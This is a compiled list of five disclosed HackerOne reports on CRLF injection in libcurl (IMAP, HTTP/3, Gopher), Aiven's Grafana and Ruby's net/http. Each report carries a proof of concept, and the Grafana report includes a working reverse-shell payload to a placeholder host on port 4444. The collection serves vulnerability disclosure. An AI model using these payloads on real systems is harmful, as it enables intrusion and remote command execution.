# CRLF Injection

_5 reports — High/Critical, disclosed_

### [CRLF Injection / Protocol Smuggling in libcurl via CURLOPT_USERNAME (IMAP)](https://hackerone.com/reports/3479984)

- **Report ID:** `3479984`
- **Severity:** Critical
- **Weakness:** CRLF Injection
- **Program:** curl
- **Reporter:** @efrsxcv
- **Bounty:** - usd
- **Disclosed:** 2025-12-28T21:28:41.492Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I have discovered a CRLF injection vulnerability in the IMAP protocol implementation of libcurl. The vulnerability exists because the `imap_atom` function in `lib/imap.c` fails to properly sanitize or quote Carriage Return (`\r`) and Line Feed (`\n`) characters when processing the `CURLOPT_USERNAME` option.

This allows an attacker to inject arbitrary IMAP commands by inserting `\r\n` sequences into the username field. When these characters are sent to the server, they terminate the current command and allow the subsequent data to be interpreted as a new, separate command (Protocol Smuggling).

## Affected version
I successfully reproduced this on the latest master branch of curl.

Output of `curl -V`:
[PASTE YOUR curl -V OUTPUT HERE]

## Steps To Reproduce:
To reproduce this issue, we need to bypass the CLI argument parsing and use `libcurl` directly via a C program. We also need a manual netcat listener to observe the raw protocol data.

1.  **Setup a Fake IMAP Server:**
    Open a terminal and listen on port 143 (or any available port) using netcat:
    `sudo nc -lvp 143`

2.  **Compile the Proof of Concept (PoC):**
    Save the following code as `poc_imap.c` and compile it against libcurl (e.g., `gcc poc_imap.c -o poc_imap -lcurl`):

    ```c
    #include <stdio.h>
    #include <curl/curl.h>

    int main(void)
    {
      CURL *curl;
      CURLcode res;

      curl_global_init(CURL_GLOBAL_DEFAULT);
      curl = curl_easy_init();
      if(curl) {
        // Target localhost on port 143
        curl_easy_setopt(curl, CURLOPT_URL, "imap://127.0.0.1:143/");

        // PAYLOAD INJECTION:
        // We inject "LOGOUT" as a separate command using CRLF.
        // If vulnerable, this will be sent as a raw new line, not quoted.
        const char *payload = "hacker\r\nLOGOUT";

        curl_easy_setopt(curl, CURLOPT_USERNAME, payload);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "password123");

        // Set a timeout to avoid hanging indefinitely during manual test
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

        // Perform the request
        res = curl_easy_perform(curl);
        
        curl_easy_cleanup(curl);
      }
      curl_global_cleanup();
      return 0;
    }
    ```

3.  **Run the PoC:**
    Execute the compiled binary: `./poc_imap`

4.  **Trigger the Injection (Manual Handshake):**
    In the terminal running `netcat` (Step 1), you will see a connection. You must manually simulate the IMAP server greeting for libcurl to proceed sending data.
    
    * Type: `* OK IMAP server ready` and press **ENTER**.
    * Wait for curl to send `A001 CAPABILITY`.
    * Type: `A001 OK Capability completed` and press **ENTER**.

5.  **Observe the Injection:**
    Immediately after the handshake, observe the output in the netcat terminal.

**Result:**
The server receives:
A002 LOGIN hacker LOGOUT password123

**Expected Behavior:**
The username should be quoted (e.g., `"hacker\r\nLOGOUT"`) or the client should reject the CRLF characters before sending.

## Supporting Material/References:
* **Vulnerable Component:** `lib/imap.c`, specifically the `imap_atom` function handling.
* **Impact:** This allows Protocol Smuggling, enabling an attacker to execute arbitrary IMAP commands (like `DELETE`, `SELECT`, `CREATE`) within the authenticated session context.

## Impact

## Summary:

---

### [HTTP/3 Protocol Smuggling and Header Injection via CRLF in QPACK value conversion](https://hackerone.com/reports/3479203)

- **Report ID:** `3479203`
- **Severity:** Critical
- **Weakness:** CRLF Injection
- **Program:** curl
- **Reporter:** @0x0000nosfu
- **Bounty:** - usd
- **Disclosed:** 2025-12-27T22:06:14.553Z
- **CVE(s):** -

**Vulnerability Information:**

A fundamental design flaw exists in how libcurl handles HTTP/3 (QUIC) response headers across all supported backends (ngtcp2, quiche, openssl-quic). The vulnerability stems from the unsafe transcoding of binary QPACK headers (HTTP/3) into the textual HTTP/1.1 format used internally by
  curl's pipeline.

  Specifically, libcurl fails to validate or sanitize header values received from the QUIC stack. If a malicious HTTP/3 server sends a header value containing Carriage Return (\r, 0x0D) and Line Feed (\n, 0x0A) characters, libcurl blindly concatenates them into its internal buffer. This
  buffer is then passed downstream to the client application as a single "header line", which effectively contains multiple injected headers or even a smuggled response body.

  This creates a Protocol Desynchronization vulnerability. While curl's internal state machine (cookies/HSTS) parses only the first line, any downstream application, proxy, or WAF relying on libcurl to fetch content will process the injected payload as valid HTTP headers or body content.
  This leads to massive Cache Poisoning, Session Fixation, and Security Bypass scenarios.

  Technical Analysis (Root Cause)

  The vulnerability resides in the callback functions responsible for receiving decoded headers from the underlying QUIC libraries.

  Location:
   * lib/vquic/curl_ngtcp2.c: Function cb_h3_recv_header
   * lib/vquic/curl_quiche.c: Function cb_each_header
   * lib/vquic/curl_osslq.c: Function cb_h3_recv_header

  Vulnerable Logic (Example from `curl_ngtcp2.c`):
  When nghttp3 delivers a header name (h3name) and value (h3val), libcurl reconstructs a text line into ctx->scratch.

    1 /* curl_ngtcp2.c around line 1780 */
    2 /* store as an HTTP1-style header */
    3 curlx_dyn_reset(&ctx->scratch);
    4 result = curlx_dyn_addn(&ctx->scratch, (const char *)h3name.base, h3name.len);
    5 if(!result)
    6   result = curlx_dyn_addn(&ctx->scratch, STRCONST(": "));
    7 if(!result)
    8   /* VULNERABILITY: h3val.base contains raw bytes from the network.
    9      If it contains \r\n, they are appended directly. */
   10   result = curlx_dyn_addn(&ctx->scratch, (const char *)h3val.base, h3val.len);
   11 if(!result)
   12   result = curlx_dyn_addn(&ctx->scratch, STRCONST("\r\n"));
   13 
   14 /* The corrupted buffer is then passed to the write handler */
   15 if(!result)
   16   h3_xfer_write_resp_hd(cf, data, stream, curlx_dyn_ptr(&ctx->scratch), ...);

  The Chain of Trust Failure:
   1. Transport: HTTP/3 allows any binary sequence in QPACK values (RFC 9114).
   2. Translation: libcurl translates this to HTTP/1.1 style "Name: Value\r\n".
   3. Delivery: Curl_client_write delivers this raw buffer to the application via CURLOPT_HEADERFUNCTION.
   4. Exploit: The application receives Name: Value\r\nInjected-Header: Evil\r\n. Standard HTTP parsers read this as two distinct headers.

  Affected version
  Current master branch and all versions with HTTP/3 support enabled.

  Steps To Reproduce

  To demonstrate this vulnerability without requiring you to set up a complex custom HTTP/3 server capable of malformed QPACK encoding, I have provided a "Simulation Patch". This patch modifies libcurl to simulate the reception of a malicious header from a server. This proves that if a
  server sends such data, libcurl fails to filter it.

  1. Build curl with HTTP/3 support (e.g., using ngtcp2)
  Ensure you have a build environment ready.

  2. Apply the Simulation Patch
  Apply the following diff to lib/vquic/curl_ngtcp2.c. This forces curl to simulate an attack where the server sends a Server header containing a CRLF injection.

    1 diff --git a/lib/vquic/curl_ngtcp2.c b/lib/vquic/curl_ngtcp2.c
    2 index XXXXXXX..XXXXXXX 100644
    3 --- a/lib/vquic/curl_ngtcp2.c
    4 +++ b/lib/vquic/curl_ngtcp2.c
    5 @@ -1780,6 +1780,16 @@ static int cb_h3_recv_header(nghttp3_conn *conn, int64_t stream_id,
    6      result = curlx_dyn_addn(&ctx->scratch, STRCONST(": "));
    7      if(!result)
    8        result = curlx_dyn_addn(&ctx->scratch,
    9                                (const char *)h3val.base, h3val.len);
   10 +
   11 +    /* POC SIMULATION: If the server sends a "server" header,
   12 +       we simulate a malicious CRLF injection appended to it. */
   13 +    if(h3name.len == 6 && !strncmp((char*)h3name.base, "server", 6)) {
   14 +        const char *injection = "\r\nSet-Cookie: session=HACKED_BY_CRLF";
   15 +        result = curlx_dyn_addn(&ctx->scratch, injection, strlen(injection));
   16 +    }
   17 +
   18      if(!result)
   19        result = curlx_dyn_addn(&ctx->scratch, STRCONST("\r\n"));
   20      if(!result)

  3. Recompile curl
   1 make

  4. Run the exploit
  Run curl against any valid HTTP/3 server (e.g., google.com or cloudflare-quic.com). The patch will simulate the malicious payload coming from that server.

   1 ./src/curl --http3 -v -I https://www.google.com/

  5. Observe the Critical Output
  Look at the headers received. You will see:

   1 HTTP/3 200
   2 ...
   3 server: gws
   4 Set-Cookie: session=HACKED_BY_CRLF
   5 ...

  Analysis:
  The Set-Cookie header appears on a new line. To any downstream parser (including curl's own -I output display, and any application using libcurl), this is a valid, separate cookie. The logic in curl failed to detect that this "header" was actually part of the server header's value.

  Supporting Material/References
   * RFC 9114 (HTTP/3): Defines that field values are sequences of bytes, placing the burden of sanitization on the implementation converting to text.
   * RFC 7230 (HTTP/1.1): Strictly forbids CR/LF in header values to prevent splitting.

## Impact

This vulnerability has a critical impact on the ecosystem of applications using libcurl with HTTP/3.

   1. WAF & Gateway Bypass: Security gateways using libcurl to inspect traffic can be bypassed. An attacker can hide malicious headers (like Content-Security-Policy: unsafe-inline or Transfer-Encoding: chunked) inside a benign header. The Gateway validates the benign header, but the
      browser/client behind it processes the injected malicious header.

   2. Massive Cache Poisoning: By injecting Transfer-Encoding or Content-Length, an attacker can desynchronize the connection (Request Smuggling). This allows them to poison the cache of a reverse proxy serving thousands of users, serving malicious content for legitimate URLs.

   3. Session Fixation / Hijacking: As demonstrated in the PoC, an attacker can inject Set-Cookie headers. Even if the application logic tries to filter headers, it will likely process the injected line as a valid new header, allowing session fixation attacks on the client side.

   4. Pollution of `curl_easy_header` API: Applications using the structured headers API to copy headers from one request to another will unwittingly propagate the malicious payload, spreading the attack deeper into internal networks.

  This is a textbook HTTP Protocol Smuggling vector enabled by the library's failure to sanitize cross-protocol data translation.

This vulnerability allows HTTP Protocol Smuggling at the library level.
   1. Cache Poisoning: If libcurl is used in a reverse proxy or gateway, injected headers (like Transfer-Encoding or Content-Length) can desynchronize the connection, causing the cache to serve malicious content to subsequent users.
   2. Session Fixation: Attackers can force Set-Cookie headers onto the client application, even if the application logic attempts to filter headers based on keys.
   3. Security Bypass: WAFs or security scanners using libcurl to inspect headers can be blinded or tricked by hiding malicious payloads behind benign headers.

---

### [Protocol Smuggling / CRLF Injection via Gopher Protocol allows Arbitrary Command Injection](https://hackerone.com/reports/3477023)

- **Report ID:** `3477023`
- **Severity:** High
- **Weakness:** CRLF Injection
- **Program:** curl
- **Reporter:** @0x0000nosfu
- **Bounty:** - usd
- **Disclosed:** 2025-12-25T21:11:46.653Z
- **CVE(s):** -

**Vulnerability Information:**

Summary:
I have discovered that the Gopher protocol implementation in curl fails to properly sanitize newline characters (%0d%0) in the selector path. This allows an attacker to inject arbitrary TCP commands when curl connects to a target server via gopher://. This vulnerability enables Protocol Smuggling attacks, turning a curl request into a weapon to interact with internal services like Redis, Memcached, or SMTP.

Affected version:
Master branch (Compiled from source on Dec 24, 2025).


Steps To Reproduce:

1. Setup a dummy listener (simulating a victim service like Redis or SMTP):
   $ nc -lvnp 11211

2. Execute the attack using a crafted Gopher URL containing URL-encoded CRLF characters:
   $ ./src/curl "gopher://127.0.0.1:11211/_Dummy%0d%0aHELLO_SERVER%0d%0"

3. Observe the output on the listener side.
   Instead of receiving a single line (safe behavior), the server receives three distinct lines (vulnerable behavior):

   [Listener Output]
   Dummy
   HELLO_SERVER
   QUIT

   This confirms that the %0d%0 sequence was decoded and transmitted as raw bytes, breaking the protocol structure.

## Impact

This vulnerability allows Protocol Smuggling. By exploiting this CRLF injection, an attacker can:

1. Interact with internal text-based protocols (Redis, Memcached, SMTP) that assume commands are separated by newlines.
2. Achieve Remote Code Execution (RCE) on internal networks by injecting Redis commands (e.g., writing a webshell via 'CONFIG SET' / 'SAVE' or overwriting 'authorized_keys').
3. Perform SMTP Injection to send forged emails from trusted internal IPs.
4. Bypass SSRF protections that rely on protocol allow-listing, as Gopher is often allowed but can simulate other protocols.

---

### [Grafana RCE via SMTP server parameter injection](https://hackerone.com/reports/1200647)

- **Report ID:** `1200647`
- **Severity:** Critical
- **Weakness:** CRLF Injection
- **Program:** Aiven Ltd
- **Reporter:** @jarij
- **Bounty:** 5000 usd
- **Disclosed:** 2022-11-08T06:29:56.557Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

This report is similar to [#1180653](https://hackerone.com/reports/1180653), except with different parameter injection entrypoint.

SMTP server password configuration setting accepts new line characters. This can be used to set non-exported configuration variables. Using this CRLF-injection, the `rendering_args` of grafana image renderer can be modified which leads to code execution on the Grafana server.

## Steps To Reproduce:

1.Create Aiven Grafana instance
2.Setup netcat listener on your server: `nc -n -lvp 4444`
3.Send the following request to the grafana instance, replace place holders. The aivenv1 token can be retrieved by inspecting the browser traffic.
4. Browse to https://INSTANCE_SUBDOMAIN.aivencloud.com/render/x to trigger the exploit.

```http
PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
Host: console.aiven.io
Connection: keep-alive
Accept: application/json
Authorization: aivenv1 AIVEN_TOKEN_HERE
X-Aiven-Client-Version: aiven-console/3.5.1-1104.g2809991854
Content-Type: application/json
Origin: https://console.aiven.io

{
    "user_config": {
        "smtp_server": {
            "host": "example.org",
            "port": 1,
            "from_address": "x@examle.org",
            "password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1"
        }
    }
}
```

## Impact

Command execution on the grafana server. Access and modify data on the grafana server and possibly the attacker could pivot into other servers on the aiven network.

---

### ['net/http': HTTP Header Injection in the set_content_type method](https://hackerone.com/reports/1168205)

- **Report ID:** `1168205`
- **Severity:** High
- **Weakness:** CRLF Injection
- **Program:** Ruby
- **Reporter:** @sighook
- **Bounty:** - usd
- **Disclosed:** 2022-02-04T06:31:47.596Z
- **CVE(s):** -

**Vulnerability Information:**

The set\_content\_type's parameter is not filtered to prevent the injection from altering the entire request.

The vulnerable code:
```ruby
  def set_content_type(type, params = {})
    @header['content-type'] = [type + params.map{|k,v|"; #{k}=#{v}"}.join('')]
  end
```

# PoC

1.
```ruby
require 'net/http'

uri = URI('http://127.0.0.1:8080')
req = Net::HTTP::Post.new(uri)
req.set_content_type('text/html', "charset" => "iso-8859-1\nHeader:Inject")

resp = Net::HTTP.start(uri.hostname, uri.port) do |http|
  http.request(req)
end
```

2.
```
$ nc -lvp 8080
Listening on 0.0.0.0 8080
Connection received on localhost 57620
POST / HTTP/1.1
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Accept: */*
User-Agent: Ruby
Host: 127.0.0.1:8080
Content-Type: text/html; charset=iso-8859-1
Header:Inject # <<<<<<<<
Content-Length: 0
```

I set the same severity as [CVE-2020-26116](https://nvd.nist.gov/vuln/detail/CVE-2020-26116) has.

## Impact

In web applications a CRLF injection can have severe impacts, depending on what the application does with single items. Impacts can range from information disclosure to code execution, a direct impact web application security vulnerability.

---
